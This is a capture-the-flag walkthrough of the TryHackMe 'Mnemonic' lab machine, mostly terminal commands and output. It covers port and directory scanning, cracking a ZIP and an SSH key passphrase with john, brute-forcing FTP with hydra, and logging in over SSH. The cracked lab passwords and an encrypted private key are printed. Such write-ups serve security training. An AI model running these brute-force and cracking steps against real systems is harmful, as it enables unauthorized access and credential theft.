# Mnemonic — Writeup

## Overview
### Mnemonic — Writeup
----
I hope you have fun.
----
![](https://tryhackme-images.s3.amazonaws.com/room-icons/497ceb5feaeff50ff8b1e6c119973591.png)
Start Machine
### Mnemonic — Writeup
You need 1 things : hurry up
[https://www.youtube.com/watch?v=pBSR3DyobIY](https://www.youtube.com/watch?v=pBSR3DyobIY)
Answer the questions below
Correct Answer

## Enumeration
```text
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.188.13 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.188.13:21
Open 10.10.188.13:80
Open 10.10.188.13:1337
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.188.13 [3 ports]
Discovered open port 21/tcp on 10.10.188.13
Discovered open port 80/tcp on 10.10.188.13
Discovered open port 1337/tcp on 10.10.188.13
Completed Connect Scan (3 total ports)
Initiating Service scan
Scanning 3 services on 10.10.188.13
Completed Service scan (3 services on 1 host)
NSE: Script scanning 10.10.188.13.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.188.13
Host is up, received user-set (0.31s latency).

PORT     STATE SERVICE REASON  VERSION
21/tcp   open  ftp     syn-ack vsftpd 3.0.3
80/tcp   open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
| http-robots.txt: 1 disallowed entry 
|_/webmasters/*
1337/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e042c0a57d426f0022f8c754aa35b9dc (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+cUIYV9ABbcQFihgqbuJQcxu2FBvx0gwPk5Hn+Eu05zOEpZRYWLq2CRm3++53Ty0R7WgRwayrTTOVt6V7yEkCoElcAycgse/vY+U4bWr4xFX9HMNElYH1UztZnV12il/ep2wVd5nn//z4fOllUZJlGHm3m5zWF/k5yIh+8x7T7tfYNsoJdjUqQvB7IrcKidYxg/hPDWoZ/C+KMXij1n3YXVoDhQwwR66eUF1le90NybORg5ogCfBLSGJQhZhALBLLmxAVOSc4e+nhT/wkhTkHKGzUzW6PzA7fTN3Pgt81+m9vaxVm/j7bXG3RZSzmKlhrmdjEHFUkLmz6bjYu3201
|   256 23eba99b45269ca213abc1ce072b98e0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOJp4tEjJbtHZZtdwGUu6frTQk1CzigA1PII09LP2Edpj6DX8BpTwWQ0XLNSx5bPKr5sLO7Hn6fM6f7yOy8SNHU=
|   256 358fcbe20d112c0b63f2bca034f3dc49 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIiax5oqQ7hT7CgO0CC7FlvGf3By7QkUDcECjpc9oV9k
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.36 seconds

http://10.10.188.13/robots.txt
Allow: / 
Disallow: /webmasters/*

┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster -t 64 dir -e -k -u http://10.10.188.13/webmasters/ -w /usr/share/wordlists/dirb/common.txt -x txt,php 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.188.13/webmasters/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              txt,php
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.10.188.13/webmasters/.hta.txt             (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/.htaccess.php        (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/.htaccess.txt        (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/.htaccess            (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/.htpasswd            (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/.htpasswd.php        (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/.htpasswd.txt        (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/.hta.php             (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/.hta                 (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/admin                (Status: 301) [Size: 323] [--> http://10.10.188.13/webmasters/admin/]
http://10.10.188.13/webmasters/backups              (Status: 301) [Size: 325] [--> http://10.10.188.13/webmasters/backups/]
http://10.10.188.13/webmasters/index.html           (Status: 200) [Size: 0]
Progress: 13817 / 13845 (99.80%)
===============================================================
 Finished
===============================================================
                                                                                   
┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster -t 64 dir -e -k -u http://10.10.188.13/webmasters/backups/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak,zip,7zip 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.188.13/webmasters/backups/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php,html,txt,bak,zip,7zip
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.10.188.13/webmasters/backups/.html                (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/.hta                 (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/.hta.7zip            (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/.hta.zip             (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/.hta.bak             (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/.htaccess            (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/.hta.txt             (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/.hta.html            (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/.hta.php             (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/.htaccess.txt        (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/.htaccess.html       (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/.htaccess.php        (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/.htaccess.zip        (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/.htaccess.bak        (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/.htpasswd            (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/.htpasswd.html       (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/.htpasswd.bak        (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/.htaccess.7zip       (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/.htpasswd.php        (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/.htpasswd.txt        (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/.htpasswd.zip        (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/.htpasswd.7zip       (Status: 403) [Size: 277]
http://10.10.188.13/webmasters/backups/backups.zip          (Status: 200) [Size: 409]

┌──(witty㉿kali)-[~/Downloads]
└─$ file backups.zip 
backups.zip: Zip archive data, at least v1.0 to extract, compression method=store
                                                                                  
┌──(witty㉿kali)-[~/Downloads]
└─$ mkdir mnemonic   
                                                                                  
┌──(witty㉿kali)-[~/Downloads]
└─$ mv backups.zip mnemonic 
                                                                                  
┌──(witty㉿kali)-[~/Downloads]
└─$ cd mnemonic 
                                                                                  
┌──(witty㉿kali)-[~/Downloads/mnemonic]
└─$ unzip backups.zip 
Archive:  backups.zip
   creating: backups/
[backups.zip] backups/note.txt password: 
   skipping: backups/note.txt        incorrect password
```
How many open ports?
*3*
what is the ssh port number?
*1337*
what is the name of the secret file?
*backups.zip*
### Task 3  Credentials

## Exploitation
```text
┌──(witty㉿kali)-[~/Downloads/mnemonic]
└─$ zip2john backups.zip > backups_hash
ver 1.0 backups.zip/backups/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 backups.zip/backups/note.txt PKZIP Encr: TS_chk, cmplen=67, decmplen=60, crc=AEE718A8 ts=24E2 cs=24e2 type=8
                                                                                  
┌──(witty㉿kali)-[~/Downloads/mnemonic]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt backups_hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
00385007         (backups.zip/backups/note.txt)     
1g 0:00:00:05 DONE () 0.1841g/s 2628Kp/s 2628Kc/s 2628KC/s 0066365..001905apekto
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

┌──(witty㉿kali)-[~/Downloads/mnemonic]
└─$ cat backups/note.txt 
@vill

James new ftp username: ftpuser
we have to work hard

┌──(witty㉿kali)-[~/Downloads/mnemonic]
└─$ hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://10.10.188.13 -t 64  
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ftp://10.10.188.13:21/
[STATUS] 729.00 tries/min, 729 tries in 00:01h, 14343684 to do in 327:56h, 50 active
[21][ftp] host: 10.10.188.13   login: ftpuser   password: love4ever
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 14 final worker threads did not complete until end.
[ERROR] 14 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished

┌──(witty㉿kali)-[~/Downloads/mnemonic/backups]
└─$ ftp 10.10.188.13 
Connected to 10.10.188.13.
220 (vsFTPd 3.0.3)
Name (10.10.188.13:witty): ftpuser
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||10001|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-1
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-10
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-2
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-3
drwxr-xr-x    4 0        0            4096 Jul 14  2020 data-4
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-5
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-6
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-7
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-8
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-9
226 Directory send OK.
ftp> ls -lah
229 Entering Extended Passive Mode (|||10063|)
150 Here comes the directory listing.
drwx------   12 1003     1003         4096 Jul 14  2020 .
drwx------   12 1003     1003         4096 Jul 14  2020 ..
lrwxrwxrwx    1 1003     1003            9 Jul 14  2020 .bash_history -> /dev/null
-rw-r--r--    1 1003     1003          220 Jul 13  2020 .bash_logout
-rw-r--r--    1 1003     1003         3771 Jul 13  2020 .bashrc
-rw-r--r--    1 1003     1003          807 Jul 13  2020 .profile
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-1
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-10
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-2
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-3
drwxr-xr-x    4 0        0            4096 Jul 14  2020 data-4
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-5
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-6
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-7
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-8
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-9
226 Directory send OK.
ftp> cd data-1
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||10070|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -lah
229 Entering Extended Passive Mode (|||10015|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 13  2020 .
drwx------   12 1003     1003         4096 Jul 14  2020 ..
226 Directory send OK.
ftp> cd ..
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||10019|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-1
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-10
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-2
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-3
drwxr-xr-x  in  4 0        0            4096 Jul 14  2020 data-4
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-5
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-6
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-7
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-8
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-9
226 Directory send OK.
ftp> cd data-4
250 Directory successfully changed.
ftp> ls -lah
229 Entering Extended Passive Mode (|||10089|)
150 Here comes the directory listing.
drwxr-xr-x    4 0        0            4096 Jul 14  2020 .
drwx------   12 1003     1003         4096 Jul 14  2020 ..
drwxr-xr-x    2 0        0            4096 Jul 14  2020 3
drwxr-xr-x    2 0        0            4096 Jul 14  2020 4
-rwxr-xr-x    1 1001     1001         1766 Jul 13  2020 id_rsa
-rwxr-xr-x    1 1000     1000           31 Jul 13  2020 not.txt
226 Directory send OK.
ftp> mget *
mget 3 [anpqy?]? yes
229 Entering Extended Passive Mode (|||10076|)
550 Failed to open file.
mget 4 [anpqy?]? yes
229 Entering Extended Passive Mode (|||10040|)
550 Failed to open file.
mget id_rsa [anpqy?]? yes
229 Entering Extended Passive Mode (|||10028|)
150 Opening BINARY mode data connection for id_rsa (1766 bytes).
100% |***********************************|  1766        8.42 MiB/s    00:00 ETA
226 Transfer complete.
1766 bytes received in 00:00 (5.80 KiB/s)
mget not.txt [anpqy?]? yes
229 Entering Extended Passive Mode (|||10095|)
150 Opening BINARY mode data connection for not.txt (31 bytes).
100% |***********************************|    31      176.00 KiB/s    00:00 ETA
226 Transfer complete.
31 bytes received in 00:00 (0.09 KiB/s)
ftp> exit
221 Goodbye.

┌──(witty㉿kali)-[~/Downloads/mnemonic/backups]
└─$ cat not.txt 
james change ftp user password

┌──(witty㉿kali)-[~/Downloads/mnemonic/backups]
└─$ cat id_rsa    
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,01762A15A5B935E96A1CF34704C79AC3

pSxCqzRmFf4dcfdkVay0+fN88/GXwl3LXOS1WQrRV26wqXTE1+EaL5LrRtET8mPM
dkScGB/cHICB0cPvn3WU8ptdYCk78w9X9wHpPBa6VLk1eRi7MANLcfRWxQ4GFwXp
CP8KSSZBCduabfcx6eLBBM8fMC+P2kgtIOhnlpt/sAU2zDQa8kZHw8V76pzcBLka
trq4ik4tpsgHqEU4BDw24bNjtJxgEy4sddtpXyy0i3KZ9gm6Uop6/jFG8uuoAQPn
AcwIZSCpjEfiMLzerVNNotZU9I11jRtbdQsxAjLPYY30PyO2cFlgpohvpyMD6lfO
33v8DOV8U69zlyUtUgArfZ9IORPKLOW5VLfuqX8yLsylVrmmuGdlfN+zO5enukjV
cg/mpJL/kePgViEqnTJf5Y8vYJ9tEGko8YBvorrsS0QXN7GJtW8h7IYrsLpXYzeu
FPD5cgEdixE4UlGo7G6nmlkikLsDwjjVIDX9C3eHljAhiktKAu19wbwdaJ8F4WWW
txZv/fsKBSI/JexzOY2lKSFq52Dod6G1eCVf0WgsQrXBOxgKn/iQ0dg4aCVNttni
kKKW3hEQP3gK6B20dnIItFzQpaqapuNJKnAWEj6YG+7QpCjncMEMUDGpCSqnMuYB
PVM3GU4sq5OO14gXtjOgTfBXP07cqkuW6L8XQl+sWobgVuIGmK69wfCZSjy29Hqo
8SmeUAdiv37UenHGLxwjelnNcblLm/BYyW6P6m6pc+zgUSK/MVysGj9B8ryLVcIc
P8O/HKResEUC/MZJGYWIZeu7UK/Ifs5IN/uTYmBM9/44tRJApvY+3rrdUUA3khjY
ZTzeX1/xS5rqprEYcr19ExboGVqNCUMHPwmufZZbB1uUagaR2Cv44j9rU19BVF1s
czMMNJGJSoeA4UKNIuXFVIMbMcZD2fCKaKYWT6C0RDS0TrAf7AUurgHReAqsQhTE
xxaGq7DLLflzVHC7EY2VhdAWmbNbGQi/k7+4wC6HTRbnLMh2kTFYMbGA64hDHxFP
DYJh4ZCEDiyWe1JkmaeAAyc2n0TCVsgEzxgGPGe3tZynVML/rFWDMA0B5kZ9VLS7
j5NOaTeWFwVy55ONPzGgCICsj+izaOuCvsbdJQ7FdQ0LPNzZ/RUFvh4k7E1ZjBos
y9GNQW8WMAWH7SFK91KdX4c+fsAPnHN/v7uF/dRWlzkusrVLznURsVtG0k2BxUwx
PYn3OG7SwGS+DyiFvvV0NspX2oIXEqA6VioqQxc+0dcEGxcyNY5uDut3BENGPD+X
Ut/fe6bIfVse+ovAb6F36SBquuDjJWCHaHyVMASlmmzA6A6XhlSnrxhVP2/cmtdo
zUicXz715Li1enhR6p68AzGhBzYZsF/F9MSbrBgust0zDeNllL/4slZ9zfrg+zUY
weJKZAn1ib9/mG+PcdcPLFTcWIbXvigSx22svaiuG9WbVzU7GolkStYnrTPdDJ8M
Nw6TzknzJ6s79cg6cKPefrQVFXYXYxSZOvK/TElYrirHqBacVwIyMxCbOgoUbsF2
ipwD46fpPTKgP6qwDirNcKtULMtEud/rbqVvnP+fqm5UC+oqoX+lb1g2fvytTXSe
-----END RSA PRIVATE KEY-----

┌──(witty㉿kali)-[~/Downloads/mnemonic/backups]
└─$ chmod 600 id_rsa     
                                                                                
┌──(witty㉿kali)-[~/Downloads/mnemonic/backups]
└─$ ssh2john id_rsa > james_hash.txt
                                                                                
┌──(witty㉿kali)-[~/Downloads/mnemonic/backups]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt james_hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bluelove         (id_rsa)     
1g 0:00:00:00 DONE () 14.28g/s 399085p/s 399085c/s 399085C/s chooch..baller15
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

┌──(witty㉿kali)-[~/Downloads/mnemonic/backups]
└─$ ssh -i id_rsa james@10.10.188.13 -p1337
Enter passphrase for key 'id_rsa': 
james@10.10.188.13's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-111-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Jul  7 20:02:03 UTC 2023

  System load:  0.0                Processes:           93
  Usage of /:   34.1% of 12.01GB   Users logged in:     0
  Memory usage: 35%                IP address for eth0: 10.10.188.13
  Swap usage:   0%

  => There is 1 zombie process.

51 packages can be updated.
0 updates are security updates.

Last login: Thu Jul 23 20:40:09 2020 from 192.168.1.5
Broadcast message from root@mnemonic (somewhere) (Fri Jul  7 20:02:30 2023):   
                                                                               
     IPS/IDS SYSTEM ON !!!!                                                    
 **     *     ****  **                                                         
         * **      *  * *                                                      
*   ****                 **                                                    
 *                                                                             
    * *            *                                                           
       *                  *                                                    
         *               *                                                     
        *   *       **                                                         
* *        *            *                                                      
              ****    *                                                        
     *        ****                                                             
                                                                               
 Unauthorized access was detected.       
james@mnemonic:~$ cat 6450.txt
5140656
354528
842004
1617534
465318
1617534
509634
1152216
753372
265896
265896
15355494
24617538
3567438
15355494
james@mnemonic:~$ cat noteforjames.txt
noteforjames.txt

@vill

